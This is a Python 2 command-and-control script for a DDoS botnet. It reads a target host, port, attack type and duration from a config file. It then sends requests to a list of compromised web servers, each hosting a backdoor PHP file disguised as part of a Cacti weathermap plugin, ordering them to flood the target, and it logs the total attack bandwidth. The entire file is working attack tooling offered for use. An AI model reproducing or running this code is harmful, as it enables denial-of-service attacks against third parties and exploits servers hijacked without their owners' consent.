#!/usr/bin/env python
#coding=utf8

import sys
import httplib
import multiprocessing
import warnings
warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf8')

httpClient = None
global totalflows
global secflows
totalflows=0.0
secflows=0.0


G = '\033[92m' #green
B = '\033[94m' #blue
R = '\033[91m' #red
W = '\033[0m'  #white



#ddos module
def ddos(u,h,p,t,at):
	global totalflows
	global secflows
	d_url="/plugins/weathermap/lib/datasources/Client_bs64.php?host="+h+"&port="+p+"&type="+t+"&time="+at
    #print "host="+h+"&port="+p+"&time="+t+"&type="+at
	hds = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain","Connection": "Keep-Alive","User-Agent": "Firefox 38esrUser-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"}     
	ulen=len(u.split(':'))
	if ulen==2:
		uip=u.replace('http://','').replace('https://','')
		uport=80
	elif ulen==3:
		uip=u.split(':')[1].replace('//','')
		uport=u.split(':')[2]
	else:
		print '[-] Bad Format: '+u
	try:
		httpClient = httplib.HTTPConnection(uip, uport, timeout=1800)
		httpClient.request('GET', d_url,headers=hds)
		response = httpClient.getresponse()
		if response.status==200:
			print '[+] Broiler Work:  '+u
			res = response.read()
			return res
		else:
			print '[-] Broiler Lost:  '+u
	except Exception, e:
		print '[-] Broiler Dead:  '+u
	finally:
		if httpClient:
			httpClient.close()


def main():
	totalflows=0.0
	secflows=0.0
	ccflows=0
	print B+'[INFO] Loading Config File...'+W
	target=open('Target.txt','r').readlines()
	host=target[0].split(':')[1].replace('\n','').replace('\r','').strip()
	port=target[1].split(':')[1].replace('\n','').replace('\r','').strip()
	atype=target[2].split(':')[1].replace('\n','').replace('\r','').strip()
	atime=target[3].split(':')[1].replace('\n','').replace('\r','').strip()
	athread=target[4].split(':')[1].replace('\n','').replace('\r','').strip()
	atd=int(athread)
	print B+'[INFO] Attack Information >> Host:'+host+'|Port:'+port+'|Type:'+atype+'|Time:'+atime+W
	print G+'[INFO] DDOS Attack Start'+W
	logs=''
	result=[]
	pool=multiprocessing.Pool(processes=atd)
	multiprocessing.freeze_support()
	urls=open('Clients.txt','r')
	for u in urls:
            u=u.replace('\r\n','').strip()
            result.append(pool.apply_async(ddos, (u, host, port, atype, atime)))
	pool.close
	pool.join
	if len(result)!=0:
		for res in result:
			ress=str(res.get())
			logs=logs+ress+'\r\n'
			resp=ress.split('|')
			if len(resp)==3:
				res_type=resp[0].strip()
				res_total=float(resp[1].replace('mb',''))
				res_sec=float(resp[2].replace('mb/s',''))
				totalflows=totalflows+res_total
				secflows=secflows+res_sec
				continue
			elif len(resp)==2:
				res_type=resp[0].strip()
				res_total=int(resp[1])
				ccflows=ccflows+res_total
				continue
			else:
				continue
		logname=host+'_log.txt'
		wlog = open(logname, 'w+')
		wlog.write(logs)
		wlog.close( )
		totalflows_g=float('%.4f'%(totalflows/1024))
		secflows_g=float('%.3f'%(secflows/1024))
		print G+'>>> DDOS Total Flows: '+str(totalflows_g)+'GB'+W
		print G+'>>> Per Seconds Flow: '+str(secflows_g)+'GB/S'+W
		print G+'>>> CC Flows: '+str(ccflows)+W
	else:
		print 'DDOS Fail'
    
if __name__=='__main__':
    main()




